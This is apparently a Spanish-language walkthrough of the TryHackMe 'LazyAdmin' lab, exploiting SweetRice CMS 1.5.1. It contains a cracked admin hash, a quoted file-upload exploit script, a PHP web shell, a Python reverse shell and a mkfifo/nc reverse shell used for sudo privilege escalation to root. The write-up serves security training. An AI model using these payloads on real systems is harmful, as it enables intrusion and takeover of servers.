---
title: Try Hack Me LazyAdmin
author: k4miyo
date: 2023-06-25
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [CMS, Upload Arbitray File, Reverse Shell]
ping: true
---

## Máquina LazyAdmin
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.59.115.

```bash
❯ ping -c 1 10.10.59.115
PING 10.10.59.115 (10.10.59.115) 56(84) bytes of data.
64 bytes from 10.10.59.115: icmp_seq=1 ttl=63 time=158 ms

--- 10.10.59.115 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 157.574/157.574/157.574/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.59.115 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 16:25 CST
Initiating Parallel DNS resolution of 1 host. at 16:25
Completed Parallel DNS resolution of 1 host. at 16:25, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:25
Scanning 10.10.59.115 [65535 ports]
Discovered open port 80/tcp on 10.10.59.115
Discovered open port 22/tcp on 10.10.59.115
Completed SYN Stealth Scan at 16:26, 21.82s elapsed (65535 total ports)
Nmap scan report for 10.10.59.115
Host is up, received user-set (0.20s latency).
Scanned at 2023-06-25 16:25:40 CST for 22s
Not shown: 65151 closed tcp ports (reset), 382 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds
           Raw packets sent: 107449 (4.728MB) | Rcvd: 100802 (4.032MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬──────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.59.115
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.59.115 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 16:26 CST
Nmap scan report for 10.10.59.115
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```

Vemos el puerto 80 abierto, por lo tanto vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.59.115/
http://10.10.59.115/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.59.115], Title[Apache2 Ubuntu Default Page: It works]
```

Visualizaremos el contenido vía web:

![""](/assets/images/thm-lazyadmin/lazyadmin.png)

No tenemos nada interesante, por lo que vamos a tratar de descubrir recursos vía web:

```bash
❯ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.59.115/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.59.115/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000061:   200        35 L     151 W      2198 Ch     "content"                                                                                                                   
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 16280
Filtered Requests: 16279
Requests/sec.: 0
```

Tenemos el directorio **content**; por lo que vamos a echarle un ojo:

![""](/assets/images/thm-lazyadmin/lazyadmin2.png)

Vemos que nos enfrentamos antes un CMS llamado **SweetRice**; por lo que lo más seguro es que tenga algún panel de login y otros recursos, así que vamos a tratar de descubrir directorios bajo `content`:

```bash
❯ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.59.115/content/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.59.115/content/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000002:   200        28 L     174 W      3443 Ch     "images"                                                                                                                    
000000939:   200        20 L     103 W      1776 Ch     "js"                                                                                                                        
000002176:   200        44 L     352 W      6684 Ch     "inc"                                                                                                                       
000003306:   200        113 L    252 W      3667 Ch     "as"                                                                                                                        
000003587:   200        16 L     60 W       963 Ch      "_themes"                                                                                                                   
000003794:   200        15 L     49 W       773 Ch      "attachment"                                                                                                                
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 273.5713
Processed Requests: 16101
Filtered Requests: 16095
Requests/sec.: 58.85484
```

De los directorios que nos aparecen, nos llama la atención:

- inc
- as
- attachment

Vamos a echarle un ojo a `inc`:

![""](/assets/images/thm-lazyadmin/lazyadmin3.png)

Nos llama la atención el directorio **mysql_backup**:

![""](/assets/images/thm-lazyadmin/lazyadmin4.png)

Nos descargarmos el archivo para echarle un ojo:

```bash
❯ catn mysql_bakup_20191129023059-1.5.1.sql
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
  1 => 'CREATE TABLE `%--%_attachment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `post_id` int(10) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `date` int(10) NOT NULL,
  `downloads` int(10) NOT NULL,
  PRIMARY KEY (`id`)

...

  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice 

... 
```

Tenemos unas credenciales del usuario **manager** y vemos que la contraseña está cifrada, por lo que vamos a crackearla con [CrackStation](https://crackstation.net/):

![""](/assets/images/thm-lazyadmin/lazyadmin5.png)

Tenemos unas credenciales **manager : Password123**. Si le echamos un ojo a los otros directorios, vemos que en `as` se tiene un panel de login de acceso al CMS SweetRice.

![""](/assets/images/thm-lazyadmin/lazyadmin6.png)

![""](/assets/images/thm-lazyadmin/lazyadmin7.png)

Vemos que se tiene el CMS SweetRice 1.5.1; por lo que vamos a ver si existe algún exploit público.

```bash
❯ searchsploit SweetRice 1.5.1
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                                                                                                                  | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                    | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                        | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                               | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                          | php/webapps/40700.html
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Observamos unos exploits que nos permite la subida de archivos; así que vamos a echarles un ojo:

```bash
# Exploit Author: Ashiyane Digital Security Team
# Date: 03-11-2016
# Vendor: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1
# Platform: WebApp - PHP - Mysql

import requests
import os
from requests import session

if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
    pass
banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

print(banner)


# Get Host & User & Pass & filename
host = input("Enter The Target URL(Example : localhost.com) : ")
username = input("Enter Username : ")
password = input("Enter Password : ")
filename = input("Enter FileName (Example:.htaccess,shell.php5,index.html) : ")
file = {'upload[]': open(filename, 'rb')}

payload = {
    'user':username,
    'passwd':password,
    'rememberMe':''
}

with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
    success = 'Login success'
    if login.status_code == 200:
        print("[+] Sending User&Pass...")
        if login.text.find(success) > 1:
            print("[+] Login Succssfully...")
        else:
            print("[-] User or Pass is incorrent...")
            print("Good Bye...")
            exit()
            pass
        pass
    uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + host + "/attachment/" + filename)
        pass
```

El exploit nos dice que en la ruta `as/?type=media_center` podemos subir un archivo de extensión `php5`. Así que vamos a crear nuestro archivo malicioso.

```bash
❯ catn k4mishell.php5
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>
```

Una vez que lo subimos, nos dirigimos en la ruta `attachment`:

![""](/assets/images/thm-lazyadmin/lazyadmin8.png)

![""](/assets/images/thm-lazyadmin/lazyadmin9.png)

Tenemos ejecución de comandos a nivel de sistema, por lo que nos aventamos una reverse shell de python de acuerdon con [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```bash
http://10.10.224.5/content/attachment/k4mishell.php5?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.9.85.95%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.9.85.95] from (UNKNOWN) [10.10.224.5] 58424
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

Hacemos un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar de manera más cómoda. Para facilitar la intrusión, se puede hacer uso del recurso [SweetRice-CMS-exploit](https://github.com/k4miyo/SweetRice-CMS-exploit).

```bash
❯ python3 sweetrice.py --url http://10.10.170.246/content --user manager --passwd Password123 --lhost 10.9.85.95
[+] Login CMS SweetRice: Login successful
[+] Shell: Established connection!
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.170.246 on port 59212
[+] Reading file: File php-reverse-shell.php5 exists!
[+] File: File uploaded
[+] Reverse Shell: Correct reverse shell
[*] Switching to interactive mode
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 04:57:01 up  1:57,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ whoami
www-data
$
```

En la ruta `/home/itguy` podemos encontrar la primera flag (user.txt). Ahora debemos buscar la forma de escalar privilegios:

```bash
www-data@THM-Chal:/home/itguy$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$
```

Podemos ejecutar `/usr/bin/perl /home/itguy/backup.pl` como cualquier usuario sin proporcionar contraseña, por lo tanto, vamos a echar un ojo al archivo `/home/itguy/backup.pl`:

```bash
www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh 
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
www-data@THM-Chal:/home/itguy$ 
```

Vemos que el archivo `backup.pl` manda a llamar al script `/etc/copy.sh` el cual genera una reverse shell hacia la 192.168.0.190:5554 y que además tenemos permisos de escritura sobre dicho archivo. Cambiamos la dirección IP por  la nuestra.

```bash
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.85.95 8443 >/tmp/f
www-data@THM-Chal:/home/itguy$
```

Ahora ejecutamos el archivo en perl  y nos ponemos en escucha por el puerto 8443:

```bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
```

```bash
❯ nc -nlvp 8443
listening on [any] 8443 ...
connect to [10.9.85.95] from (UNKNOWN) [10.10.224.5] 53298
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).